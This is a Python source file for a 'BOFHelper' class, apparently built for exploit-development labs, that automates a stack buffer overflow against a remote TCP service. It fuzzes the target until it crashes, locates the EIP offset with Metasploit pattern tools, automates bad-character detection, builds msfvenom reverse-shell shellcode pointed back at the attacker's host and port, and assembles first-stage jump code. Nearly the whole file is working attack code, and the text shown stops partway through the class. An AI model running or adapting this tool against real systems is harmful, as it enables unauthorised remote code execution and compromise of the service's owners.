#!/usr/bin/python
import socket
import time
from binascii import unhexlify
from re import search, split
from struct import pack
from subprocess import run

from pwn import asm

# Error codes
BOFErrorSuccess = 0
BOFErrorFailure = -1
BOFErrorConnectionRefused = -2
BOFErrorConnectionReset = -3
BOFErrorConnectionTimeout = -4
BOFErrorServiceAlive = -5
BOFErrorNoSpace = -6
BOFErrorInvalid = -7

BOFAllHex = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '0a', '0b', '0c', '0d', '0e', '0f', '10', '11',
             '12', '13', '14', '15', '16', '17', '18', '19', '1a', '1b', '1c', '1d', '1e', '1f', '20', '21', '22',
             '23', '24', '25', '26', '27', '28', '29', '2a', '2b', '2c', '2d', '2e', '2f', '30', '31', '32', '33',
             '34', '35', '36', '37', '38', '39', '3a', '3b', '3c', '3d', '3e', '3f', '40', '41', '42', '43', '44',
             '45', '46', '47', '48', '49', '4a', '4b', '4c', '4d', '4e', '4f', '50', '51', '52', '53', '54', '55',
             '56', '57', '58', '59', '5a', '5b', '5c', '5d', '5e', '5f', '60', '61', '62', '63', '64', '65', '66',
             '67', '68', '69', '6a', '6b', '6c', '6d', '6e', '6f', '70', '71', '72', '73', '74', '75', '76', '77',
             '78', '79', '7a', '7b', '7c', '7d', '7e', '7f', '80', '81', '82', '83', '84', '85', '86', '87', '88',
             '89', '8a', '8b', '8c', '8d', '8e', '8f', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99',
             '9a', '9b', '9c', '9d', '9e', '9f', 'a0', 'a1', 'a2', 'a3', 'a4', 'a5', 'a6', 'a7', 'a8', 'a9', 'aa',
             'ab', 'ac', 'ad', 'ae', 'af', 'b0', 'b1', 'b2', 'b3', 'b4', 'b5', 'b6', 'b7', 'b8', 'b9', 'ba', 'bb',
             'bc', 'bd', 'be', 'bf', 'c0', 'c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7', 'c8', 'c9', 'ca', 'cb', 'cc',
             'cd', 'ce', 'cf', 'd0', 'd1', 'd2', 'd3', 'd4', 'd5', 'd6', 'd7', 'd8', 'd9', 'da', 'db', 'dc', 'dd',
             'de', 'df', 'e0', 'e1', 'e2', 'e3', 'e4', 'e5', 'e6', 'e7', 'e8', 'e9', 'ea', 'eb', 'ec', 'ed', 'ee',
             'ef', 'f0', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'fa', 'fb', 'fc', 'fd', 'fe', 'ff']

# Live prefix/suffix options
BOFLiveOptions = ["payload_len", "local_host", "remote_host", "local_port", "remote_port"]


def live_option_long(option: str) -> bytes:
    return ("BOFLive." + option).encode()


def execute(cmd: str) -> bytes:
    return run(cmd, shell=True, capture_output=True).stdout


def is_hex(integer: str) -> bool:
    return not search(r"[^a-f0-9]", integer)


def is_register(reg: str) -> bool:
    regs = ['ax', 'bx', 'cx', 'dx', 'bp', 'sp', 'si', 'di']
    if len(reg) != 3:
        return False
    if reg[0] != "r" and reg[0] != "e":
        return False
    for item in regs:
        if reg[1:] == item:
            return True
    return False


def bytes_escape_all(in_byte: bytes) -> list[str]:
    out_str = []
    for b in in_byte:
        out_str.append(''.join('\\x{:02x}'.format(b)))
    return out_str


def bytes_escape_all_str(in_bytes: bytes) -> str:
    return "'{}'".format(''.join('\\x{:02x}'.format(b) for b in in_bytes))


def split_list(lst: list, n: int) -> list[list]:
    d, r = divmod(len(lst), n)
    for i in range(n):
        si = (d + 1) * (i if i < r else r) + d * (0 if i < r else i - r)
        yield lst[si:si + (d + 1 if i < r else d)]


# @class BOFHelper
# @abstract Class performing simple buffer overflow against specified target.
# @discussion     This class exploits a basic buffer overflow (without ASLR, DEP, etc.), cover-
#                 ing every step involved. With independent functions to handle fuzzing, EIP
#                 location, bad character detection, shellcode generation, space expansion,
#                 file generation, and, with everything gathered, exploit dispatch, it provides
#                 maximum flexibility and customizability for almost any scenario. In addition
#                 to prefixes and suffixes, it supports live headers to be sent before the payload,
#                 which would be particularly useful when the attack surface is an HTTP request.
#                 During the reconnaissance process, this program is designed with minimal user
#                 interaction in mind. For instance, its automated bad character detection process
#                 only requires the user to restart the service when prompted, with no need to
#                 continuously investigate the ESP dump (until all critical bad characters are
#                 found). It eventually generates a well-formatted Python 2 POC script based on
#                 the information gathered so that the user can easily replicate the exploit.
#
#                 All other types of buffer overflow should be handled by subclasses of this
#                 base class. Make sure to adhere to the structure and workflow of this class
#                 and override all necessary functions.
# @var interface  The interface from which all data would be sent. The local would be obtained
#                 based on the interface specified.
# @var local_port The local port that the target would connect to once exploited.
# @var ip         The remote IP to connect to.
# @var port       The remote port to connect to.
# @var header     The live header that is appended before the payload. It could be altered based
#                 on the circumstance of each send_data() request. Refer to send_data() for more
#                 details.
#                 All possible live options are listed in @BOFLiveOptions. To use one, simply
#                 replace the relevant substring of the header with "BOFLive." plus an option.
# @var prefix     Fixed prefix of the payload.
# @var suffix     Fixed suffix of the payload.
# @var inc        The step of increment during the fuzzing stage.
# @var timeout    The timeout for send_data() requests. Increase if your connection is slow.
# @var recv       Set to true only if the service responds to a request. Otherwise, it might
#                 cause the program to hang.
# @var ask_crash  Prompt everytime if the service has crashed instead of inferring it from the
#                 result of send_data(). Set to true if your service can be connected to after
#                 it crashes.
# @var strict     In some edge cases, the EIP can be controlled only with a payload of a certain
#                 size. The program would try to find this value if it is set to true. Beware
#                 that the process may require extensive use of a debugger and be very tedious.
# @var verify     Send an empty payload after every send_data() request to verify that the service
#                 has crashed successfully. May be required in some edge cases.
# @var debug      Verbose logging.


class BOFHelper:
    def __init__(self, interface: str, local_port: int, ip: str, port: int, header: bytes = b"",
                 prefix: bytes = b"", suffix: bytes = b"", inc: int = 200, timeout: float = 10.0,
                 recv: bool = False, ask_crash: bool = False, strict: bool = False, verify: bool = False,
                 debug: bool = True):
        self._interface = interface
        self._lPort = local_port
        self._lIP = execute("ip addr show %s | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1" % self._interface) \
            .decode().strip()
        self._ip = ip
        self._port = port
        self._header = header
        self._origHeader = header
        self._liveOptions = {}
        self._prefix = prefix
        self._suffix = suffix
        self._inc = inc  # The step of increment in getNumBytesToOverflow().
        self._timeout = timeout  # The default value of 200 would be the efficient for most services.
        self._recv = recv
        self._askCrash = ask_crash
        self._strict = strict
        self._verify = verify
        self._debug = debug

        self._init_options()

        self._numBytes = 0
        self._numBytesObtained = False
        self._strictSizeFound = False
        self._eipOffset = 0
        self._eipObtained = False
        self._badChars = ["00"]
        self._badCharsFound = False
        self._shellCode = b""
        self._shellCodeName = ""
        self._shellCodeGenerated = False
        self._espPadding = 0
        self._espPaddingSet = False
        self._firstStageASM = ""
        self._firstStage = b""
        self._stackSpace = 0
        self._shellCodeInESP = True
        self._spaceExpanded = False
        self._eip = b""
        self._exploit = b""
        self._endPadding = 0
        self._fileGenerated = False

    def __del__(self):
        if not self._fileGenerated:
            self._step_log("Printing information...")
            if self._strict and self._numBytesObtained:
                self._success_log("Strict payload size: %d" % self._numBytes)
            if self._eipObtained:
                self._success_log("EIP Offset: %d" % self._eipOffset)
            if self._espPaddingSet:
                self._success_log("ESP Padding: %d" % self._espPadding)
            if self._badCharsFound:
                self._success_log("Bad characters: 0x%s" % " 0x".join(self._badChars))
            if self._shellCodeGenerated and not self._shellCodeInESP:
                self._success_log(("First stage shell code: %s" % bytes_escape_all_str(self._firstStage))
                                  .replace("'", ""))
            if self._spaceExpanded:
                self._success_log("Stack space: %d" % self._stackSpace)
            if self._eip:
                self._success_log(("Overridden EIP: %s" % bytes_escape_all_str(self._eip)).replace("'", ""))

    # Logs & Helpers

    def _input(self, text: str, debug: bool = False) -> str:
        if (not debug) or (debug and self._debug):
            return input("(*) " + text).strip()

    def __log(self, text: str, debug: bool = False) -> None:
        if (not debug) or (debug and self._debug):
            print(text)

    def _func_log(self, text: str, debug: bool = False) -> None:
        self.__log("[-] " + text, debug)

    def _success_log(self, text: str, debug: bool = False) -> None:
        self.__log("[+] " + text, debug)

    def _debug_log(self, text: str) -> None:
        self.__log("(-) " + text, True)

    def _step_log(self, text: str, debug: bool = False) -> None:
        self.__log("(+) " + text, debug)

    def _prompt_log(self, text: str, debug: bool = False) -> None:
        self.__log("(*) " + text, debug)

    def _warn_log(self, text: str, debug: bool = False) -> None:
        self.__log("(!) " + text, debug)

    def _err_log(self, text: str, debug: bool = False) -> None:
        self.__log("(!!!) " + text, debug)

    def _prompt_restart(self) -> None:
        self._prompt_log("Please restart the vulnerable application. Type anything to continue...")
        input()

    def _prompt_debugger(self) -> None:
        self._prompt_log("GO! Fire up your debugger! Type anything to continue...")
        input()

    # @function _init_options
    # @abstract Initialize each option of @self._liveOptions to specified values.
    # @result   None.

    def _init_options(self) -> None:
        for option in BOFLiveOptions:
            full_option = live_option_long(option)
            if full_option in self._header:
                if option == "local_host":
                    self._liveOptions[full_option] = self._lIP.encode()
                elif option == "remote_host":
                    self._liveOptions[full_option] = self._ip.encode()
                elif option == "local_port":
                    self._liveOptions[full_option] = bytes(self._lPort)
                elif option == "remote_port":
                    self._liveOptions[full_option] = bytes(self._port)
                else:
                    self._liveOptions[full_option] = b""

    # @function _process_header_file
    # @abstract Process the header for use in generated POC.
    # @param header Original header.
    # @result       Updated header.

    def _process_header_file(self, header: str) -> str:
        header = header.replace(live_option_long("payload_len").decode(), "' + str(len(payload)) + '") \
            .replace(live_option_long("local_host").decode(), self._lIP) \
            .replace(live_option_long("remote_host").decode(), self._ip) \
            .replace(live_option_long("local_port").decode(), str(self._lPort)) \
            .replace(live_option_long("remote_port").decode(), str(self._port))
        return header

    # @function send_data
    # @abstract Helper function sending data to designated port on the target.
    # @discussion   In this function, a socket is created to send the data in @buffer to @self._port.
    #               The payload would be sent with the predefined prefix and suffix, and if the
    #               request has timed out, it would be resent recursively (up to five times). If
    #               the user has provided a header, its live options, if there is any, would be
    #               updated based on the current request. To test if the service is open, simply
    #               pass an empty (i.e. "") @buffer as the argument.
    # @param buffer Bytes object storing the data to be sent.
    # @param close  Determines whether to close the socket. Set to false when sending the final
    #               exploit.
    # @param trial  Records the number of time this request has been resent. Set to 5 to disable
    #               resending in case of socket timeout.
    # @result       BOFErrorSuccess if succeeded; BOFErrorConnectionRefused if connection refused;
    #               BOFErrorConnectionReset if connection reset; BOFErrorConnectionTimeout if socket
    #               timed out.

    def send_data(self, buffer: bytes, trial: int = 3, close: bool = True) -> int:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((self._ip, self._port))
            if self._origHeader:
                payload_len = live_option_long("payload_len")
                if payload_len in self._origHeader:
                    self._liveOptions[payload_len] = str(len(buffer) + len(self._prefix) + len(self._suffix)).encode()
                self._header = self._origHeader
                for option in self._liveOptions:
                    self._header = self._header.replace(option, self._liveOptions[option])

            s.send((self._header + self._prefix + buffer + self._suffix))
            if self._recv:
                res = s.recv(1024).decode()
                self._debug_log(res)
            if close:
                s.close()

            if self._verify and buffer:
                time.sleep(1)
                return self.send_data(b"")

        except ConnectionRefusedError:
            return BOFErrorConnectionRefused

        except ConnectionResetError:
            return BOFErrorConnectionReset

        except socket.timeout:
            if trial < 5:
                return self.send_data(buffer, trial + 1)
            self._err_log("Could not connect to %s at port %s!" % (self._ip, self._port))
            self._warn_log("Remember to start the service!")
            return BOFErrorConnectionTimeout

        return BOFErrorSuccess

    # @function _check_crash
    # @abstract Check if the service has crashed, based on @error or user input.
    # @param error If @self._askCrash has not been set, the status of the service would be determined
    #              based on it.
    # @result      True if the service has crashed; False otherwise.

    def _check_crash(self, error: int) -> bool:
        if self._askCrash:
            ans = self._input("Did the service crash? (y/n): ").lower()
            if ans == 'y':
                return True
            return False
        if error == BOFErrorConnectionReset or error == BOFErrorConnectionRefused:
            return True
        return False

    # @function get_esp_padding
    # @abstract Ask for the ESP padding.
    # @result    None.

    def get_esp_padding(self) -> None:
        ans = self._input("How many bytes are between EIP and ESP (blank to skip): ")
        if ans == "" or ans == "q":
            self._espPadding = 0
            self._espPaddingSet = True
        self._espPadding = int(ans)
        self._espPaddingSet = True

    # @function set_esp_padding
    # @abstract Sets the ESP padding.
    # @result    None.

    def set_esp_padding(self, padding: int) -> None:
        self._espPadding = padding
        self._espPaddingSet = True

    # @function _fuzz_bytes_overflow
    # @abstract Private function for finding a rough number of bytes needed to overflow the service.
    # @discussion     This function recursively sends buffers, incrementing in size each iteration by
    #                 @self._inc, to the service and checks if it has crashed. If an overflow has been
    #                 triggered successfully, it would update @self._numBytes with @current.
    # @param current  The number of bytes that is to be sent to the service in the current iteration.
    # @result         BOFErrorSuccess if succeeded; BOFErrorConnectionRefused if failed on first trial;
    #                 BOFErrorTimeout if timed out.

    def _fuzz_bytes_overflow(self, current: int = 0) -> int:
        if current == 0:
            self._debug_log("Checking if service is open...")
        else:
            self._debug_log("Fuzzing with %s bytes..." % current)

        error = self.send_data(b"\x90" * current)
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # Service didn't crash -> increment @current by self._inc
        if not self._check_crash(error):
            if current == 0:
                self._debug_log("Service is open!")
            return self._fuzz_bytes_overflow(current + self._inc)

        # Service crashed -> print and proceed
        if current == 0:
            self._err_log("Service is not open!")
            return BOFErrorConnectionRefused

        self._success_log("Service crashed at %s bytes!" % current)
        self._prompt_restart()

        # high = @current (as it has successfully caused overflow)
        # low = previous @current (i.e. current - self._inc)
        self._numBytes = current
        return BOFErrorSuccess

    # @function _ask_eip
    # @abstract Ask the user if EIP has been successfully overridden and update @self._numBytes if so.
    # @result   True if EIP is overridden; False otherwise.

    def _ask_eip(self, current) -> bool:
        ans = self._input("Is EIP overridden by 90909090 (y/n): ").lower()
        self._prompt_restart()
        if ans == 'y':
            self._success_log("Strict size found: %d" % current)
            self._numBytes = current
            self._strictSizeFound = True
            return True
        return False

    # @function _find_crash_threshold
    # @abstract Find the specific payload length on which the service first crashed.
    # @discussion Utilizing a binary search approach, this function recursively finds the smallest value
    #             on which the service would crash which would be used in later functions to find the
    #             strict payload size with which EIP could be obtained. Note that the debugger should
    #             the kept open during the execution of this function. Extensive user interaction may
    #             be required, but it should only be needed in edge cases.
    # @param high The current minimum number of bytes needed to overflow the service.
    # @param low  The current maximum number of bytes that would not overflow the service.
    # @result     BOFErrorSuccess is succeeded; BOFErrorConnectionTimeout if timed out.

    def _find_crash_threshold(self, high: int = 0, low: int = 0) -> int:
        if self._strictSizeFound:
            return BOFErrorSuccess

        # Success!
        if low + 1 == high:
            self._success_log("Crash threshold found: %s!\n" % high)
            self._numBytes = high
            return BOFErrorSuccess

        self._prompt_debugger()
        mid = low + (high - low) // 2  # Safe way to get mid
        self._debug_log("Sending buffer of size %s..." % mid)
        error = self.send_data(b"\x90" * mid)
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # Did not crash -> set @low to mid
        if not self._check_crash(error):
            return self._find_crash_threshold(high, mid)

        # Service crashed -> set @high to mid
        if self._ask_eip(mid):
            return BOFErrorSuccess
        return self._find_crash_threshold(mid, low)

    # @function get_num_bytes
    # @abstract Find the particular payload size needed to crash the service and obtain EIP.
    # @discussion This function starts by fuzzing the service with _fuzz_bytes_overflow() to
    #             determine a size that would crash the service. If the class is in strict
    #             mode, it would attempt to first discover the crash threshold with function
    #             _find_crash_threshold(). With the threshold discovered, this function steps
    #             up from it one byte at a time in order to find the strict size for EIP control.
    #             Beware that this function may take a great amount of user interaction.
    # @result     @self._numBytes if succeeded; BOFErrorFailure if fuzzing failed; BOFErrorInvalid
    #             if service did not crash; BOFErrorConnectionTimeout if timed out.

    def get_num_bytes(self) -> int:
        self._func_log("Fuzzing service...")
        if not self._numBytesObtained:
            if self._fuzz_bytes_overflow():
                return BOFErrorFailure
            self._numBytesObtained = True

        if self._strict and not self._strictSizeFound:
            if self._find_crash_threshold(self._numBytes, self._numBytes - self._inc) == BOFErrorConnectionTimeout:
                return BOFErrorConnectionTimeout
            while True:
                self._prompt_debugger()
                if not self._check_crash(self.send_data(b"\x90" * self._numBytes)):
                    self._err_log("Service did not crash! (should never happen)")
                    return BOFErrorInvalid
                if self._ask_eip(self._numBytes):
                    break
                self._numBytes += 1
                continue

        return self._numBytes

    # @function set_num_bytes
    # @abstract Sets the number of bytes needed to overflow the service.
    # @param num_bytes The number of bytes required to overflow the service.
    # @param strict    Sets the class in strict mode.
    # @result          None.

    def set_num_bytes(self, num_bytes: int, strict: bool = False) -> None:
        self._strict = strict
        self._numBytes = num_bytes
        self._numBytesObtained = True
        if strict:
            self._strictSizeFound = True

    # @function get_eip_offset
    # @abstract Obtain the EIP offset for the specified service.
    # @discussion With @self._numBytes obtained, this function locates the offset of ESP with a
    #             unique pattern of length @self._numBytes, generated by the msf_pattern_create
    #             utility. If the service has crashed due to overflow, the user should provide
    #             the value at the EIP register which would be then used to identify the exact
    #             offset of EIP on the stack. The user would also be prompted to provide the
    #             value at the top of ESP so that the program could automatically calculate the
    #             ESP padding.
    # @result     @self._eipOffset if succeeded; BOFErrorConnectionTimeout if service timed out;
    #             BOFErrorServiceAlive if service did not crash; BOFErrorFailure if the value is
    #             not found in the pattern; BOFErrorInvalid if @self._numBytes is not obtained
    #             or if the stack size is too small.

    def get_eip_offset(self) -> int:
        self._func_log("Locating EIP...")
        if self._eipObtained:
            return self._eipOffset

        if not self._numBytesObtained:
            self._err_log("Please first obtain the number of bytes needed to overflow the service!")
            return BOFErrorInvalid

        if self._strict and not self._strictSizeFound:
            self._err_log("Please first obtain the strict payload size!")
            return BOFErrorInvalid

        self._prompt_debugger()
        error = self.send_data(execute("msf-pattern_create -l %s" % self._numBytes))
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # Service didn't crash. Bye!
        if not self._check_crash(error):
            self._err_log("Service did not crash!")
            return BOFErrorServiceAlive

        # Service crashed -> find EIP & ESP padding
        eip = self._input("Service crashed. Please enter the value in EIP: ").replace("\\x", "").replace("0x", "")
        esp = self._input("Please enter the first 4 bytes of ESP in the stack: ").replace("\\x", "").replace("0x", "")
        self._step_log("Locating EIP offset and ESP padding in the pattern...")

        try:
            self._eipOffset = int(execute("msf-pattern_offset -q %s" % eip).decode().split()[-1])
            self._espPadding = int(execute("msf-pattern_offset -q %s" % esp).decode().split()[-1]) - self._eipOffset - 4
            self._espPaddingSet = True
        except IndexError:
            self._warn_log("Value not found in pattern!")
            return BOFErrorFailure

        self._eipObtained = True
        self._stackSpace = self._numBytes - self._eipOffset - 4 - self._espPadding
        if self._stackSpace <= 0:
            self._err_log("Stack space should be greater than 0!")
            return BOFErrorInvalid
        self._success_log("EIP Offset: %s" % self._eipOffset)
        self._success_log("ESP Padding: %s" % self._espPadding)
        self._prompt_restart()
        return self._eipOffset

    # @function set_eip_offset
    # @abstract Manually set the EIP offset to a specified value.
    # @param offset The value @self._eipOffset is set to.

    def set_eip_offset(self, offset: int) -> None:
        if not self._espPaddingSet:
            self.get_esp_padding()
        if not self._numBytesObtained:
            self._numBytes = offset + 100
            self._numBytesObtained = True
        self._eipOffset = offset
        self._eipObtained = True

    # @function __check_input
    # @abstract Helper function to check for new bad characters in user input.
    # @result   None.

    def __check_input(self) -> None:
        ans = self._input("Enter bad characters found (separate with space): ") \
            .lower().replace("\\x", "").replace("0x", "")
        if ans == "":
            self._success_log("Empty input, assuming that all bad characters have been found!")
            return

        for char in ans.split():
            if is_hex(char) and len(char) == 2:
                self._badChars.append(char)
                BOFAllHex.remove(char)

    # @function __check_dump
    # @abstract Helper function to check for new bad characters in hex dump.
    # @result   None.

    def __check_dump(self, chars: list[str]) -> None:
        self._prompt_log("Dump at least %d bytes (stop input with \"q\"): " % len(BOFAllHex))
        new_chars = []
        while True:
            ans = input().strip().lower().replace("\\x", "").replace("0x", "")
            if ans == "q":
                break
            for item in split(r"[ |]", ans):
                if is_hex(item) and len(item) == 2:
                    new_chars.append(item)
        while new_chars[0] != chars[0] and new_chars[0] != "00":
            new_chars.pop(0)

        self._prompt_log("Processed dump: %s" % " ".join(new_chars))
        if self._input("Proceed? (y/n)\n").lower() != 'y':
            self._err_log("Dump malformed! Try again!")
            return self.__check_dump(chars)

        if len(new_chars) < len(chars):
            self._err_log("Dump is too small! Try again!")
            return self.__check_dump(chars)

        for i in range(len(chars)):
            if chars[i] != new_chars[i]:
                self._step_log("Identified new bad character: 0x%s" % chars[i])
                self._badChars.append(chars[i])
                BOFAllHex.remove(chars[i])

    # @function __build_bad_buffer
    # @abstract Build the buffer to send based on the current character list.
    # @discussion  It would place @chars in the middle of the filler space before EIP.
    # @param chars The current character list.
    # @result      The assembled bytes object to send to the service.

    def __build_bad_buffer(self, chars: list[str]) -> bytes:
        offset_len = self._eipOffset - len(chars)
        return b"\x90" * (offset_len // 2) \
               + unhexlify("".join(chars)) \
               + b"\x90" * (self._numBytes - len(chars) - (offset_len // 2))

    # @function __send_chars_user
    # @abstract Private function sending non-critical characters and asking for user input to determine
    #           remaining bad characters.
    # @discussion   After all critical bad characters have been discovered through __send_chars_auto, this
    #               function sends the updated character list, supposedly causing a crash, and prompts the
    #               user for either a hex dump or bad characters they identified manually. This is the last
    #               step of bad character detection.
    # @param chars  The list of characters to be sent to the service.
    # @param manual Whether to ask the user to manually identify bad characters instead of providing a hex
    #               dump.
    # @result       BOFErrorSuccess if succeeded; BOFErrorConnectionTimeout if timed out; BOFErrorServiceAlive
    #               if service did not crash.

    def __send_chars_user(self, chars: list[str], manual: bool = False) -> int:
        error = self.send_data(self.__build_bad_buffer(chars))
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # Service should always crash
        if not self._check_crash(error):
            self._err_log("Service did not crash! (should never happen)")
            return BOFErrorServiceAlive

        self._success_log("Characters sent!")
        if manual:
            self.__check_input()
        else:
            self._prompt_log("Scroll to the middle of the 90's and make sure the dump starts with 01 02 03 04...!!!")
            self.__check_dump(chars)
        return BOFErrorSuccess

    # @function __send_chars_auto
    # @abstract Recursively sends and updates character list to determine critical bad characters
    # @discussion  This recursive function continuously send a list of string to the service until all
    #              bad characters in it have been found. If the service did not crash due to send_data(),
    #              the list would be split in two and sent respectively (with this function). The user
    #              simply has to repeatedly restart the service as prompted.
    # @param chars The list of characters to be sent to the service.
    # @result      BOFErrorSuccess if succeeded; BOFErrorConnectionTimeout if timed out.

    def __send_chars_auto(self, chars: list[str]) -> int:
        self._debug_log("Sending: %s" % " ".join(chars))
        error = self.send_data(self.__build_bad_buffer(chars))
        if error == BOFErrorConnectionTimeout:
            return BOFErrorConnectionTimeout

        # If the service has crashed, there would be no bad characters in this subset
        if self._check_crash(error):
            self._prompt_restart()
            return BOFErrorSuccess

        # Service did not crash
        if len(chars) == 1:
            self._step_log("Identified new bad character: 0x%s" % chars[0])
            self._badChars.append(chars[0])
            BOFAllHex.remove(chars[0])
            return BOFErrorSuccess

        # Split
        for chunk in split_list(chars, 2):
            error = self.__send_chars_auto(chunk)
            if error:
                return error

        return BOFErrorSuccess

    # @function _send_chars
    # @abstract Helper function to send all hex characters to the service.
    # @discussion   This function splits BOFAllHex into chunks of @size and sends them respectively with
    #               either __send_chars_auto() or __send_chars_user().
    # @param size   The size of each segment to send.
    # @param auto   Whether to use __send_chars_auto() or __send_chars_user().
    # @param manual Whether to ask the user to manually identify bad characters instead of providing a
    #               dump. Taken into account only if auto is set.
    # @result       BOFErrorSuccess if succeeded; BOFErrorConnectionTimeout if timed out; BOFErrorServiceAlive
    #               if service did not crash.

    def _send_chars(self, size: int, auto: bool = False, manual: bool = False) -> int:
        for i in range(0, len(BOFAllHex), size):
            if auto:
                error = self.__send_chars_auto(BOFAllHex[i:i + size])
            else:
                error = self.__send_chars_user(BOFAllHex[i:i + size], manual)
            if error:
                return error
        return BOFErrorSuccess

    # @function find_bad_chars
    # @abstract Find bad characters in the service.
    # @discussion This function attempts to discover all bad characters present in the service. It
    #             initially uses the automated __send_chars_auto() helper to obtain all critical bad
    #             characters (i.e. ones that would cause the service to not crash). Afterwards, it
    #             sends the updated list of characters to the services with __send_chars_user(), which
    #             would ask for user input that indicates the remaining bad characters.
    #             Note that get_eip_offset() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorFailure if failed; BOFErrorInvalid if function
    #             get_eip_offset() is not yet invoked.

    def find_bad_chars(self, manual: bool = False) -> int:
        if not self._eipObtained:
            self._err_log("Please first locate the EIP offset!")
            return BOFErrorInvalid

        if not self._badCharsFound:
            self._step_log("Starting automatic detection of bad characters...")
            size = self._eipOffset
            if self._eipOffset >= len(BOFAllHex):
                size = len(BOFAllHex)
            if self._send_chars(size, True):
                return BOFErrorFailure

            self._success_log("Automatic bad character detection complete!")
            self._success_log("Bad characters found: 0x%s" % " 0x".join(self._badChars))
            self._step_log("Sending characters to determine non-critical bad characters...")
            self._debug_log("Characters to send: 0x%s" % " 0x".join(BOFAllHex))
            self._prompt_debugger()
            if self._send_chars(size, False, manual):
                return BOFErrorFailure
            self._prompt_restart()

        self._badChars.sort()
        self._success_log("All bad characters: 0x%s" % " 0x".join(self._badChars))
        self._badCharsFound = True
        return BOFErrorSuccess

    # @function set_bad_chars
    # @abstract Manually input the bad characters identified.
    # @param bad_chars The value @self._badChars is set to.
    # @result          None.

    def set_bad_chars(self, bad_chars: list[str]) -> None:
        for item in bad_chars:
            if not is_hex(item) or len(item) != 2:
                bad_chars.remove(item)
        self._badChars.extend(bad_chars)
        self._badChars = list(set(self._badChars))
        self._badChars.sort()
        self._badCharsFound = True

    # @function generate_shellcode
    # @abstract Generate the shellcode for use in exploitation.
    # @discussion This function generates the shellcode with the command line package msfvenom. It
    #             first asks for the user to specify a payload to use - if it does not exist, a list
    #             of all available payloads would be printed. After successfully parsing the name,
    #             this function executes a msfvenom command to generate the payload, automatically
    #             completing the parameters with previously obtained values. The shellcode is stored
    #             in @self._shellCode.
    #             Note that function find_bad_chars() must be run before executing this function.
    # @result     BOFErrorSuccess if succeeded; BOFErrorInvalid if function find_bad_chars() is not
    #             yet invoked.

    def generate_shellcode(self) -> int:
        self._func_log("Generating shellcode...")

        if not self._badCharsFound:
            self._err_log("Please first find the bad characters!")
            return BOFErrorInvalid

        # Add NOP slides
        self._shellCode += b"\x90" * int(self._input("Number of NOP slides: "))
        self._step_log("Generating list of all payloads...")
        all_payloads = execute("msfvenom --list payload").decode()
        while True:
            ans = self._input("Please enter the name of the payload to employ: ").lower()
            if ans in all_payloads:
                self._shellCodeName = ans
                break
            self._warn_log("Payload name does not exist. Printing help page...")
            print(all_payloads)

        if not self._lIP:
            self._warn_log("Failed to get local IP.")
            try:
                ip = self._input("Local IP: ")
                socket.inet_aton(ip)
            except socket.error:
                self._err_log("IP address invalid!")
                return BOFErrorFailure
            self._lIP = ip

        self._step_log("Generating shellcode %s..." % self._shellCodeName)
        self._shellCode += execute("msfvenom -p %s LHOST=%s LPORT=%d EXITFUNC=thread -f raw –e x86/shikata_ga_nai "
                                   "-b \"\\x%s\"" % (ans, self._lIP, self._lPort, "\\x".join(self._badChars)))
        self._shellCodeGenerated = True
        self._success_log("Shellcode generated!")
        return BOFErrorSuccess

    # @function _check_space
    # @abstract Helper function to check if a certain amount of space is available in ESP.
    # @discussion  It sends a payload with @space amount of bytes after ESP. The space's availability
    #              is verified if the user confirms that the EIP and stack behave as expected.
    # @param space The amount of space whose availability would be checked.
    # @result      True if available; False otherwise.

    def _check_space(self, space: int) -> bool:
        self._step_log("Checking if a space of %d is available in ESP..." % space)
        if self._stackSpace >= space:
            self._success_log("Space (size = %d) available!" % space)
            return True

        if self._strict:
            if space > self._numBytes - self._eipOffset - 4 - self._espPadding:
                self._err_log("Space unavailable!")
                return False
            return True

        self._prompt_debugger()
        error = self.send_data(b"\x90" * self._eipOffset + b"A" * 4 + b"\x90" * (self._espPadding + space), 5)
        if error == BOFErrorConnectionTimeout:
            return False

        # Service should always crash
        if not self._check_crash(error):
            self._err_log("Service did not crash! (should never happen)")
            return False

        # User validation required
        ans = self._input("Payload sent. Check to see if EIP is filled with 41414141 and if there is %d 90's after it. "
                          "(y/n)\n").lower()

        # Success! Update stack space.
        if ans == 'y':
            self._success_log("Space (size = %d) available!" % space)
            self._stackSpace = space
            self._prompt_restart()
            return True

        self._prompt_restart()
        return False

    # @function _find_space
    # @abstract Private function to locate space before EIP for the payload.
    # @discussion This function checks if the space before EIP could be used to store the payload
    #             should ESP prove to be unavailable. If the space before EIP is larger than the
    #             size of @self._shellcode, it would proceed to insert a first stage shellcode in
    #             the ESP so that the program could jump to the shellcode. The user needs to provide
    #             the register that the filler appears to be in. If no such register exist, an egg
    #             hunter would be placed in ESP to search in memory for the shellcode.
    # @result     BOFErrorSuccess if succeeded; BOFErrorNoSpace if there is no sufficient space for
    #             payload; BOFErrorServiceAlive if service did not crash.

    def _find_space(self) -> int:
        if self._eipOffset < len(self._shellCode):
            self._err_log("There is not enough space before EIP to insert the payload!")
            return BOFErrorNoSpace

        # Generate first stage shellcode
        self._prompt_debugger()
        if not self._check_crash(self.send_data(b"\x90" * self._numBytes)):
            return BOFErrorServiceAlive
        register = self._input("Please enter the register that records your payload: ").lower()
        if is_register(register):
            skip = int(self._input("Bytes to skip: "))
            if skip > 0:
                self._firstStageASM = "add %s, %d" % (register, skip)
                self._firstStage = asm(self._firstStageASM)
            jmp = "jmp %s" % register
            self._firstStage += asm(jmp)
            self._firstStageASM += jmp
            if not self._check_space(len(self._firstStage)):
                self._err_log("There is not enough space in ESP for the first stage shellcode!")
                return BOFErrorNoSpace
        else:
            # TO-DO: EGG HUNTER
            self._warn_log("Register invalid! Building egg hunter...")
            return BOFErrorInvalid

        # We have the entire filler space at our disposal
        self._prompt_restart()
        self._stackSpace = self._eipOffset
        self._spaceExpanded = True
        self._success_log("The filler space (%s) is all yours :)" % self._eipOffset)
